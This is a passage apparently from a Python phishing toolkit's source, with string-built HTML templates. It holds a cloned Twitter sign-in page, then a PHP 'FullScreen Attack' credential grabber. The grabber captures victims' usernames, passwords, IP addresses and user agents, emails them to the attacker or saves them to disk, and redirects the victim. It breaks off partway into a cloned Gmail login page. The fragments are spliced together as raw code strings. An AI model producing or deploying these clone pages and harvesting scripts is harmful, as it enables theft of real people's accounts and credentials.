  <div class="swift-media-gallery">
    <div class="modal-header">
      <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <a class="gridview grid-action" href="#">
          <span class="icon grid-icon">
            <span class="visuallyhidden"></span>
          </span>
      </a>
      <h2 class="modal-title"></h2>
    </div>
    <div class="gallery-media"></div>
    <div class="gallery-nav nav-prev">
      <span class="nav-prev-handle"></span>
    </div>
    <div class="gallery-nav nav-next">
      <span class="nav-next-handle"></span>
    </div>
    <div class="tweet-inverted gallery-tweet"></div>
  </div>
</div>

    
    <div class="modal-overlay"></div>
    
    
    
    
    <div id="goto-user-dialog" class="modal-container">
  <div class="modal modal-small draggable">
    <div class="modal-content">
      <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>

      <div class="modal-header">
        <h3 class="modal-title">Go to a person's profile</h3>
      </div>

      <div class="modal-body">
        <div class="modal-inner">
          <form class="goto-user-form">
            <input class="input-block username-input" type="text" placeholder="Start typing a name to jump to a profile">
            
            
            
            <div role="menu" aria-hidden="true" class="dropdown-menu typeahead ">
              <div aria-hidden="true" class="dropdown-caret">
                <div class="caret-outer"></div>
                <div class="caret-inner"></div>
              </div>
              <div role="presentation" class="dropdown-inner js-typeahead-results">
                <div role="presentation" class="typeahead-saved-searches">
      <ul role="presentation" class="typeahead-items saved-searches-list">
        
        <li role="presentation" class="typeahead-item typeahead-saved-search-item">
          <span class="icon close" aria-hidden="true"><span class="visuallyhidden">Remove</span></span>
          <a role="menuitem" aria-describedby="saved-searches-heading" class="js-nav" href="" data-search-query="" data-query-source="" data-ds="saved_search" tabindex="-1"><span class="icon generic-search"></span></a>
        </li>
      </ul>
    </div>
    <ul role="presentation" class="typeahead-items typeahead-topics">
      
      <li role="presentation" class="typeahead-item typeahead-topic-item">
        <a role="menuitem" class="js-nav" href="" data-search-query="" data-query-source="typeahead_click" data-ds="topics" tabindex="-1">
          <span class="icon generic-search"></span>
        </a>
      </li>
    </ul>
    
    
    
    
    <ul role="presentation" class="typeahead-items typeahead-accounts js-typeahead-accounts">
      
      <li role="presentation" data-user-id="" data-user-screenname="" data-remote="true" data-score="" class="typeahead-item typeahead-account-item js-selectable">
        
        <a role="menuitem" class="js-nav" data-query-source="typeahead_click" data-search-query="" data-ds="account">
          <img class="avatar size24" alt="">
          <span class="typeahead-user-item-info">
            <span class="fullname"></span>
            <span class="js-verified hidden"><span class="icon verified"><span class="visuallyhidden">Verified account</span></span></span>
            <span class="username"><s>@</s><b></b></span>
          </span>
        </a>
      </li>
      <li role="presentation" class="js-selectable typeahead-accounts-shortcut js-shortcut"><a role="menuitem" class="js-nav" href="" data-search-query="" data-query-source="typeahead_click" data-shortcut="true" data-ds="account_search"></a></li>
    </ul>
    <ul role="presentation" class="typeahead-items typeahead-trend-locations-list">
      
      <li role="presenation" class="typeahead-item typeahead-trend-locations-item"><a role="menuitem" class="js-nav" href="" data-ds="trend_location" data-search-query="" tabindex="-1"></a></li>
    </ul>    <ul role="presentation" class="typeahead-items typeahead-context-list">
      
      <li role="presentation" class="typeahead-item typeahead-context-item"><a role="menuitem" class="js-nav" href="" data-ds="context_helper" data-search-query="" tabindex="-1"></a></li>
    </ul>  </div>
            </div>
          </form>
        </div>
      </div>

    </div>
  </div>
</div>

      <div id="retweet-tweet-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal draggable">
      <div class="modal-content">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>

        <div class="modal-header">
          <h3 class="modal-title">Retweet this to your followers?</h3>
        </div>
  
        <div class="modal-body modal-tweet"></div>
  
        <div class="modal-footer">
          <button class="btn cancel-action js-close">Cancel</button>
          <button class="btn primary-btn retweet-action">Retweet</button>
        </div>
      </div>
    </div>
  </div>  <div id="delete-tweet-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal draggable">
      <div class="modal-content">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>

        <div class="modal-header">
          <h3 class="modal-title">Are you sure you want to delete this Tweet?</h3>
        </div>
  
        <div class="modal-body modal-tweet"></div>
  
        <div class="modal-footer">
          <button class="btn cancel-action js-close">Cancel</button>
          <button class="btn primary-btn delete-action">Delete</button>
        </div>
      </div>
    </div>
  </div>

    
<div id="keyboard-shortcut-dialog" class="modal-container">
  <div class="close-modal-background-target"></div>
  <div class="modal modal-large draggable">
    <div class="modal-content">
      <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>

      
      <div class="modal-header">
        <h3 class="modal-title">Keyboard shortcuts</h3>
      </div>

      
      <div class="modal-body">

        <div class="keyboard-shortcuts clearfix" id="keyboard-shortcut-menu">
          <p class="visuallyhidden">
            Note: To use these shortcuts, users of screen readers may need to toggle off the virtual navigation.
          </p>
          <table class="modal-table">
            <tbody>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">Enter</b>
                </td>
                <td class="shortcut-label">Open Tweet details</td>
              </tr>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">g</b> <b class="sc-key">f</b>
                </td>
                <td class="shortcut-label">Go to user...</td>
              </tr>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">?</b>
                </td>
                <td class="shortcut-label">This menu</td>
              </tr>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">j</b>
                </td>
                <td class="shortcut-label">Next Tweet</td>
              </tr>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">k</b>
                </td>
                <td class="shortcut-label">Previous Tweet</td>
              </tr>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">Space</b>
                </td>
                <td class="shortcut-label">Page down</td>
              </tr>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">/</b>
                </td>
                <td class="shortcut-label">Search</td>
              </tr>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">.</b>
                </td>
                <td class="shortcut-label">Load new Tweets</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  </div>
</div>



    <div id="block-user-dialog" class="modal-container">
  <div class="close-modal-background-target"></div>
  <div class="modal draggable">
    <div class="modal-content">
      <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>

      <div class="modal-header">
        <h3 class="modal-title">Are you sure you want to block this user?</h3>
      </div>

      <div class="modal-body modal-tweet"></div>

      <div class="modal-footer">
        <button class="btn cancel-action js-close">Cancel</button>
        <button class="btn primary-btn block-action">Block</button>
      </div>
    </div>
  </div>
</div>

    
      
      
    
        <div id="geo-disabled-dropdown">
          <div class="dropdown-menu" tabindex="-1">
        <div class="dropdown-caret">
          <span class="caret-outer"></span>
          <span class="caret-inner"></span>
        </div>
        <ul>
          <li class="geo-not-enabled-yet">
            <h2>Add a location to your Tweets</h2>
            <p>
              When you tweet with a location, Twitter stores that location.&#32;
              You can switch location on/off before each Tweet and always have the option to delete your location history.
              <a href="http://support.twitter.com/forums/26810/entries/78525" target="_blank">Learn more</a>
            </p>
            <div>
              <button type="button" class="geo-turn-on btn primary-btn">Turn location on</button>
              <button type="button" class="geo-not-now btn-link">Not now</button>
            </div>
          </li>
        </ul>
      </div>    </div>
    
      <div id="geo-enabled-dropdown">
        <div class="dropdown-menu" tabindex="-1">
      <div class="dropdown-caret">
        <span class="caret-outer"></span>
        <span class="caret-inner"></span>
      </div>
      <ul>
        <li class="geo-query-location">
          <input type="text" autocomplete="off" placeholder="Search for a neighborhood or city">
          <span class="icon generic-search"></span>
        </li>
        <li class="geo-dropdown-status"></li>
        <li class="dropdown-link geo-turn-off-item geo-focusable">
          <span class="icon close"></span>Turn off location
        </li>
      </ul>
    </div>  </div>
    
    
      <div id="profile_popup" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal modal-small draggable">
      <div class="modal-content clearfix">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <div class="modal-header">
          <h3 class="modal-title">Profile summary</h3>
        </div>
  
        <div class="modal-body profile-modal">
  
        </div>
  
        <div class="loading">
          <span class="spinner-bigger"></span>
        </div>
      </div>
    </div>
  </div>  <div id="list-membership-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal modal-small draggable">
      <div class="modal-content">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <div class="modal-header">
          <h3 class="modal-title">Your lists</h3>
        </div>
        <div class="modal-body">
          <div class="list-membership-content"></div>
          <span class="spinner lists-spinner" title="Loading&hellip;"></span>
        </div>
      </div>
    </div>
  </div>  <div id="list-operations-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal modal-medium draggable">
      <div class="modal-content">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <div class="modal-header">
          <h3 class="modal-title">Create a new list</h3>
        </div>
        <div class="modal-body">
          
        <div class="list-editor">
          <div class="field">
            <label for="list-name">List name</label>
            <input type="text" class="text" name="name" value="" />
          </div>
          <div class="field" style="display:none">
            <label for="list-link">List link</label>
            <span></span>
          </div>
          <hr/>
        
          <div class="field">
            <label for="description">Description</label>
            <textarea name="description"></textarea>
            <span class="help-text">Under 100 characters, optional</span>
          </div>
          <hr/>
        
          <div class="field">
            <label for="mode">Privacy</label>
            <div class="options">
              <label for="list-public-radio">
                <input class="radio" type="radio" name="mode" id="list-public-radio" value="public" checked="checked"  />
                <b>Public</b> &middot; Anyone can follow this list
              </label>
              <label for="list-private-radio">
                <input class="radio" type="radio" name="mode" id="list-private-radio" value="private"  />
                <b>Private</b> &middot; Only you can access this list
              </label>
            </div>
          </div>
          <hr/>
        
          <div class="list-editor-save">
            <button type="button" class="btn btn-primary update-list-button" data-list-id="">Save list</button>
          </div>
        
        </div>      </div>
      </div>
    </div>
  </div>
      <div id="activity-popup-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal draggable">
      <div class="modal-content clearfix">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>

        <div class="modal-header">
          <h3 class="modal-title"></h3>
        </div>
  
        <div class="modal-body">
          <div class="activity-tweet clearfix"></div>
          <div class="loading">
            <span class="spinner-bigger"></span>
          </div>
          <div class="activity-content clearfix"></div>
        </div>
      </div>
    </div>
  </div>

    <div id="confirm_dialog" class="modal-container">
  <div class="close-modal-background-target"></div>
  <div class="modal draggable">
    <div class="modal-content">
      <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <div class="modal-header">
        <h3 class="modal-title"></h3>
      </div>
      <div class="modal-body">
        <p class="modal-body-text"></p>
      </div>
      <div class="modal-footer">
        <button class="btn js-close" id="confirm_dialog_cancel_button"></button>
        <button id="confirm_dialog_submit_button" class="btn primary-btn modal-submit"></button>
      </div>
    </div>
  </div>
</div>

    
    
      <div id="embed-tweet-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal modal-medium draggable">
      <div class="modal-content">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <div class="modal-header">
          <h3 class="modal-title">Embed this Tweet</h3>
        </div>
        <div class="modal-body">
          <div class="embed-code-container">
          <p>Add this Tweet to your website by copying the code below. <a href="//dev.twitter.com/docs/embedded-tweets">Learn more</a></p>
          <form>
        
            <div class="embed-destination-wrapper">
              <div class="embed-overlay embed-overlay-spinner"><div class="embed-overlay-content"></div></div>
              <div class="embed-overlay embed-overlay-error">
                <p class="embed-overlay-content">Hmm, there was a problem reaching the server. <a href="javascript:;">Try again?</a></p>
              </div>
              <textarea class="embed-destination js-initial-focus"></textarea>
              <div class="embed-options">
                <div class="embed-include-parent-tweet">
                  <label for="include-parent-tweet">
                    <input type="checkbox" id="include-parent-tweet" class="include-parent-tweet" checked>
                    Include parent Tweet
                  </label>
                </div>
                <div class="embed-include-card">
                  <label for="include-card">
                    <input type="checkbox" id="include-card" class="include-card" checked>
                    Include media
                  </label>
                </div>
              </div>
            </div>
          </form>
          <div class="embed-preview">
            <h3>Preview</h3>
          </div>
        </div>
      </div>
      </div>
    </div>
  </div>

    
    
    
      
    <div id="signin-or-signup-dialog">
      <div id="signin-or-signup" class="modal-container">
        <div class="close-modal-background-target"></div>
        <div class="modal modal-medium draggable">
          <div class="modal-content">
            <button type="button" class="modal-btn modal-close js-close">
                <span class="icon close-medium">
                  <span class="visuallyhidden">Close</span>
                </span>
          </button>
          <div class="modal-header">
              <h3 class="modal-title modal-long-title signup-only">Sign up for Twitter &amp; follow @<span></span></h3>
              <h3 class="modal-title not-signup-only">Sign in to Twitter</h3>
            </div>
            <div class="modal-body signup-only">
              <form action="https://twitter.com/signup" class="clearfix signup" method="post">
              <div class="holding name">
                <input type="text" autocomplete="off" name="user[name]" maxlength="20" class="js-initial-focus">
                <span class="holder">Full name</span>
              </div>
              <div class="holding email">
                <input class="email-input" type="text" autocomplete="off" name="user[email]">
                <span class="holder">Email</span>
              </div>
              <div class="holding password">
                <input type="password" name="user[user_password]">
                <span class="holder">Password</span>
              </div>
              <input type="hidden" value="" name="context">
              <input type="hidden" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58" name="authenticity_token"/>
              <input name="follows" type="hidden" value="">
              <input type="submit" class="btn signup-btn js-submit js-signup-btn" value="Sign up">
            </form>
          </div>
            <div class="modal-body not-signup-only">
              <form action="https://twitter.com/sessions" class="signin" method="post">
              <fieldset>
  
    <div class="clearfix holding hasome">
      <span class="username js-username holder">Username or email</span>
      <input class="js-username-field email-input js-initial-focus" type="text" name="session[username_or_email]" autocomplete="on" value="">
    </div>
  
    <div class="clearfix holding">
      <span class="password holder">Password</span>
      <input class="js-password-field" type="password" name="session[password]">
    </div>
  
    <input type="hidden" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58" name="authenticity_token"/>
  
  </fieldset>
  <div class="clearfix">
  
    <input type="hidden" name="scribe_log">
    <input type="hidden" name="redirect_after_login" value="/">
    <input type="hidden" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58" name="authenticity_token"/>
    <button type="submit" class="submit btn primary-btn">Sign in</button>
  
    <fieldset class="subchck">
      <label class="remember">
        <input type="checkbox" value="1" name="remember_me" checked="checked">
        Remember me
      </label>
    </fieldset>
    <span class="separator"></span>
    <a class="forgot" href="/account/resend_password">Forgot password?</a>
  
  </div>
  <div class="divider"></div>
              <p>
                <a class="forgot" href="/account/resend_password">Forgot password?</a><br />
                <a class="mobile has-sms" href="/account/complete">Already using Twitter via text message?</a>
              </p>
            </form>
            <div class="signup">
                <h2>Not on Twitter? Sign up, tune into the things you care about, and get updates as they happen.</h2>
                <form action="https://twitter.com/signup" class="signup" method="get">
                <button class="btn promotional signup-btn" type="submit">Sign up &raquo;</button>
              </form>
            </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div id="sms-codes-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal modal-medium draggable">
      <div class="modal-content">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <div class="modal-header">
          <h3 class="modal-title">Two-way (sending and receiving) short codes:</h3>
        </div>
        <div class="modal-body">
          
        <table id="sms_codes" cellpadding="0" cellspacing="0">
          <thead>
            <tr>
              <th>Country</th>
              <th>Code</th>
              <th>For customers of</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>United States</td>
              <td>40404</td>
              <td>(any)</td>
            </tr>
            <tr>
              <td>Canada</td>
              <td>21212</td>
              <td>(any)</td>
            </tr>
            <tr>
              <td>United Kingdom</td>
              <td>86444</td>
              <td>Vodafone, Orange, 3, O2</td>
            </tr>
            <tr>
              <td>Brazil</td>
              <td>40404</td>
              <td>Nextel, TIM</td>
            </tr>
            <tr>
              <td>Haiti</td>
              <td>40404</td>
              <td>Digicel, Voila</td>
            </tr>
            <tr>
              <td>Ireland</td>
              <td>51210</td>
              <td>Vodafone, O2</td>
            </tr>
            <tr>
              <td>India</td>
              <td>53000</td>
              <td>Bharti Airtel, Videocon, Reliance</td>
            </tr>
            <tr>
              <td>Indonesia</td>
              <td>89887</td>
              <td>AXIS, 3, Telkomsel, Indosat, XL Axiata</td>
            </tr>
            <tr>
              <td rowspan="2">Italy</td>
              <td>4880804</td>
              <td>Wind</td>
            </tr>
            <tr>
              <td>3424486444</td>
              <td>Vodafone</td>
            </tr>
          </tbody>
          <tfoot>
            <tr>
              <td colspan="3">
                &raquo; <a class="js-initial-focus" target="_blank" href="http://support.twitter.com/articles/14226-how-to-find-your-twitter-short-code-or-long-code">See SMS short codes for other countries</a>
              </td>
            </tr>
          </tfoot>
        </table>      </div>
      </div>
    </div>
  </div>    <div class="hidden">
      <iframe class="tweet-post-iframe" name="tweet-post-iframe"></iframe>
    
    </div>    
    <div id="spoonbill-outer"></div>
  </body>
</html>
  <input type="hidden" id="init-data" class="json-data" value="{&quot;assetsBasePath&quot;:&quot;https:\/\/abs.twimg.com\/a\/1383847355\/&quot;,&quot;preflight&quot;:false,&quot;loggedIn&quot;:false,&quot;asyncSocialProof&quot;:true,&quot;typeaheadData&quot;:{&quot;fullNameMatchingInCompose&quot;:false,&quot;recentSearches&quot;:{&quot;enabled&quot;:false},&quot;remoteDebounceInterval&quot;:300,&quot;showSearchAccountSocialContext&quot;:true,&quot;dmAccounts&quot;:{&quot;onlyDMable&quot;:true,&quot;remoteQueriesEnabled&quot;:false,&quot;enabled&quot;:false,&quot;localQueriesEnabled&quot;:false},&quot;hashtags&quot;:{&quot;remoteQueriesEnabled&quot;:false,&quot;prefetchLimit&quot;:500,&quot;enabled&quot;:false,&quot;localQueriesEnabled&quot;:false},&quot;topics&quot;:{&quot;remoteQueriesEnabled&quot;:false,&quot;prefetchLimit&quot;:500,&quot;showTypeaheadTopicSocialContext&quot;:false,&quot;enabled&quot;:false,&quot;localQueriesEnabled&quot;:false,&quot;limit&quot;:4},&quot;savedSearches&quot;:{&quot;items&quot;:[],&quot;enabled&quot;:false},&quot;remoteThrottleInterval&quot;:300,&quot;showDebugInfo&quot;:false,&quot;accounts&quot;:{&quot;remoteQueriesEnabled&quot;:false,&quot;enabled&quot;:false,&quot;localQueriesEnabled&quot;:false,&quot;limit&quot;:6},&quot;useThrottle&quot;:true,&quot;tweetContextEnabled&quot;:false,&quot;accountsOnTop&quot;:false},&quot;bodyFoucClassNames&quot;:&quot;swift-loading&quot;,&quot;userId&quot;:null,&quot;researchExperiments&quot;:{},&quot;pageName&quot;:&quot;login&quot;,&quot;mediaGrid&quot;:true,&quot;viewContainer&quot;:&quot;#page-container&quot;,&quot;geoEnabled&quot;:false,&quot;sandboxes&quot;:{&quot;detailsPane&quot;:&quot;https:\/\/abs.twimg.com\/a\/1383847355\/details_pane_content_sandbox.html&quot;,&quot;jsonp&quot;:&quot;https:\/\/abs.twimg.com\/a\/1383847355\/jsonp_sandbox.html&quot;},&quot;baseFoucClass&quot;:&quot;swift-loading&quot;,&quot;environment&quot;:&quot;production&quot;,&quot;deciders&quot;:{&quot;mqImageUploads&quot;:false,&quot;preserve_scroll_position&quot;:false,&quot;oembed_use_macaw_syndication&quot;:true,&quot;pushState&quot;:true,&quot;hqImageUploads&quot;:false,&quot;disable_profile_popup&quot;:false},&quot;debugAllowed&quot;:false,&quot;notifications_timeline&quot;:null,&quot;pushState&quot;:true,&quot;timelineCardsGallery&quot;:true,&quot;hasPushDevice&quot;:null,&quot;dmTopNavEnabled&quot;:false,&quot;scribeParameters&quot;:{},&quot;searchPathWithQuery&quot;:&quot;\/search?q=query&amp;src=typd&quot;,&quot;formAuthenticityToken&quot;:&quot;d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58&quot;,&quot;scribeBufferSize&quot;:3,&quot;notifications_dm&quot;:null,&quot;pushStatePageLimit&quot;:500000,&quot;permalinkCardsGallery&quot;:false,&quot;deviceEnabled&quot;:false,&quot;isMonorail&quot;:true,&quot;initialState&quot;:{&quot;ttft_navigation&quot;:false,&quot;page_container_class_names&quot;:&quot;wrapper wrapper-login white&quot;,&quot;title&quot;:&quot;Sign in to Twitter&quot;,&quot;section&quot;:null,&quot;route_name&quot;:&quot;login&quot;,&quot;module&quot;:&quot;app\/pages\/login&quot;,&quot;doc_class_names&quot;:&quot;route-login&quot;,&quot;body_class_names&quot;:&quot;t1 logged-out&quot;,&quot;cache_ttl&quot;:300},&quot;routes&quot;:{&quot;profile&quot;:&quot;\/&quot;},&quot;profileHoversEnabled&quot;:false,&quot;internalReferer&quot;:null,&quot;notifications_spoonbill&quot;:null,&quot;dragAndDropPhotoUpload&quot;:true,&quot;experiments&quot;:{},&quot;notifications_dm_poll_scale&quot;:null,&quot;href&quot;:&quot;\/login\/error?redirect_after_login=%2F&amp;username_or_email=&quot;,&quot;smsDeviceVerified&quot;:null,&quot;screenName&quot;:null,&quot;rosetta&quot;:false,&quot;sectionName&quot;:&quot;error&quot;}">
    <input type="hidden" class="swift-boot-module" value="app/pages/login">
  <input type="hidden" id="swift-module-path" value="https://abs.twimg.com/c/swift/en">

  
    <script src="https://abs.twimg.com/c/swift/en/init.60642a289b5798dceb687c1681a7ae951106fb23.js" async></script>




</div>        
        <script src=\""""+pathList[3]+"""\"></script> 
        <script src=\""""+pathList[4]+"""\"></script>
        <script src=\""""+pathList[5]+"""\"></script>
        <script src=\""""+pathList[6]+"""\"></script>
        <script src=\""""+pathList[7]+"""\"></script>

</body>
</html>
<?PHP
// FullScreen Attack PHP Relay and Grab Code
// Written By: d4rk0
// Twitter: @d4rk0s


function writeFile($fileName,$data,$fileType){
    // This Opens file at end for writing if doesnt exist tries to create it
    $file = fopen($fileName, 'a');
    fwrite($file, $data);
    fclose($file);
  }


function sendM($to,$message){
        // To send HTML mail, the Content-type header must be set
        $headers  = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
        // Additional headers
        $headers .= 'From: SET Attack <fullscreen@phish.org>' . "\\r\\n";
        $subject = "Victims Information";
        // Mail it
        mail($to, $subject, $message, $headers);
 }

function pageForward($page){
        // Page Forward
        echo '<meta http-equiv="refresh" content="0;URL='.$page.'">';
 }

function randomFilename(){
     // return random file name
    mt_srand(time()%2147 * 1000000 + (double)microtime() * 1000000); 
    $randomNUM = mt_rand(1, 972484); 
    $fileNAME = "report" . $randomNUM. ".txt";
    return $fileNAME;
 }


function pullIP(){
    // This Returns an IP of person
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){   //to check ip is pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    return $ip;
 }

function userAgent(){
    $Agent = $_SERVER['HTTP_USER_AGENT'];
    return $Agent;
 }


if(isset($_POST['submit'])){

       $action  = \""""+valueList[0]+"""\";
       $redirect = \""""+valueList[1]+"""\";
       $verbose = \""""+valueList[2]+"""\";
       $fileName = \""""+valueList[3]+"""\";
       $to = \""""+valueList[3]+"""\";
       // Grab Form Values
       $email = $_POST[\"Username\"];
       $password =  $_POST[\"Password\"];
   
    // Specify rest of PHP code
       
    // Verbose loud
    if ($verbose == "loud"){
        $IP = pullIP();
        $Agent = userAgent();
        $message = "-- Information Request: \n"." Email / Username: " . $email . " \n Password: " . $password . "\n -- Other Information: ".
        "\n Victim IP: " .$IP. " UserAgent: ".$Agent;
        }

   // Verbose quiet
   if ($verbose == "quiet"){
        $message = "-- Information Request: \n"." Email / Username: " . $email . " \n Password: " . $password . "\n -- END OF TRANSCRIPT";
        }


    // Send in mail
    if ($action == "mail"){
       // Email Message 
        sendM($to,$message);
        pageForward($redirect);
    }
  

    // Save to ServerDisk as Same File
    if ($action == "diskFile"){
        // Write to Individual File 
        if ($fileName == ""){ $fileName = "SETInfo.txt";  }
        writeFile($fileName,$message);
        pageForward($redirect);
    }


    // Save to ServerDisk Random File
    if ($action == "diskRandom"){
        // Get random File name
        $fileName = randomFilename();          
        writeFile($fileName,$message);
        pageForward($redirect);
    }

 }

?>
            """
            # Append code to list
            indexList.append(indexCode)
            # Append Index List
            return indexList    


        # GMAIL HTML For GMAIL
        if codeType == "GMAIL":
            indexList = []
            indexCode = """
<!doctype html>
<html class="no-js" lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>"""+title+"""</title>
<meta name="description" content="">
<link rel="stylesheet" href="css/style.css">
</head>
<body>
  
   <a class=\"spoofLink\" href=\""""+pathList[0]+"""\">"""+pathList[1]+"""</a>

  <div id="spoofHeader">
    <div id="spoofMenu"></div>
    <div id="spoofBrowser"></div>
  </div>


<div id="spoofSite">

<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <title>Gmail: Email from Google</title>
  <meta name="description" content="10+ GB of storage, less spam, and mobile access. Gmail is email that&#39;s intuitive, efficient, and useful. And maybe even fun.">
  <link rel="icon" type="image/ico" href="http://mail.google.com/favicon.ico">
<style type="text/css">
  html, body, div, h1, h2, h3, h4, h5, h6, p, img, dl,
  dt, dd, ol, ul, li, table, tr, td, form, object, embed,
  article, aside, canvas, command, details, fieldset,
  figcaption, figure, footer, group, header, hgroup, legend,
  mark, menu, meter, nav, output, progress, section, summary,
  time, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
  }
  article, aside, details, figcaption, figure, footer,
  header, hgroup, menu, nav, section {
  display: block;
  }
  html {
  font: 81.25% arial, helvetica, sans-serif;
  background: #fff;
  color: #333;
  line-height: 1;
  direction: ltr;
  }
  a {
  color: #15c;
  text-decoration: none;
  }
  a:active {
  color: #d14836;
  }
  a:hover {
  text-decoration: underline;
  }
  h1, h2, h3, h4, h5, h6 {
  color: #222;
  font-size: 1.54em;
  font-weight: normal;
  line-height: 24px;
  margin: 0 0 .46em;
  }
  p {
  line-height: 17px;
  margin: 0 0 1em;
  }
  ol, ul {
  list-style: none;
  line-height: 17px;
  margin: 0 0 1em;
  }
  li {
  margin: 0 0 .5em;
  }
  table {
  border-collapse: collapse;
  border-spacing: 0;
  }
  strong {
  color: #222;
  }
</style>
<style type="text/css">
  html, body {
  position: absolute;
  height: 100%;
  min-width: 100%;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .wrapper + style + iframe {
  display: none;
  }
  .content {
  padding: 0 44px;
  }
  .topbar {
  text-align: right;
  padding-top: .5em;
  padding-bottom: .5em;
  }
  .google-header-bar {
  height: 71px;
  background: #f1f1f1;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  margin: 17px 0 0;
  float: left;
  }
  .header .signin,
  .header .signup {
  margin: 28px 0 0;
  float: right;
  font-weight: bold;
  }
  .header .signin-button,
  .header .signup-button {
  margin: 22px 0 0;
  float: right;
  }
  .header .signin-button a {
  font-size: 13px;
  font-weight: normal;
  }
  .header .signup-button a {
  position: relative;
  top: -1px;
  margin: 0 0 0 1em;
  }
  .main {
  margin: 0 auto;
  width: 650px;
  padding-top: 23px;
  padding-bottom: 100px;
  }
  .main h1:first-child {
  margin: 0 0 .92em;
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #ebebeb;
  overflow: hidden;
  }
  .footer {
  padding-top: 9px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  color: #999;
  float: left;
  max-width: 80%;
  }
  .footer ul li {
  display: inline;
  padding: 0 1.5em 0 0;
  }
  .footer a {
  color: #333;
  }
  .footer .lang-chooser-wrap {
  float: right;
  max-width: 20%;
  }
  .footer .lang-chooser-wrap img {
  vertical-align: middle;
  }
  .footer .attribution {
  float: right;
  }
  .footer .attribution span {
  vertical-align: text-top;
  }
  .redtext {
  color: #dd4b39;
  }
  .greytext {
  color: #555;
  }
  .secondary {
  font-size: 11px;
  color: #666;
  }
  .source {
  color: #093;
  }
  .hidden {
  display: none;
  }
  .announce-bar {
  position: absolute;
  bottom: 35px;
  height: 33px;
  z-index: 2;
  width: 100%;
  background: #f9edbe;
  border-top: 1px solid #efe1ac;
  border-bottom: 1px solid #efe1ac;
  overflow: hidden;
  }
  .announce-bar .message {
  font-size: .85em;
  line-height: 33px;
  margin: 0;
  }
  .announce-bar .message .separated {
  margin-left: 1.5em;
  }
  .announce-bar-ac {
  background: #eee;
  border-top: 1px solid #e5e5e5;
  border-bottom: 1px solid #e5e5e5;
  }
  .clearfix:after {
  visibility: hidden;
  display: block;
  font-size: 0;
  content: '.';
  clear: both;
  height: 0;
  }
  * html .clearfix {
  zoom: 1;
  }
  *:first-child+html .clearfix {
  zoom: 1;
  }
  pre {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  }
</style>
<style type="text/css">
  button, input, select, textarea {
  font-family: inherit;
  font-size: inherit;
  }
  button::-moz-focus-inner,
  input::-moz-focus-inner {
  border: 0;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
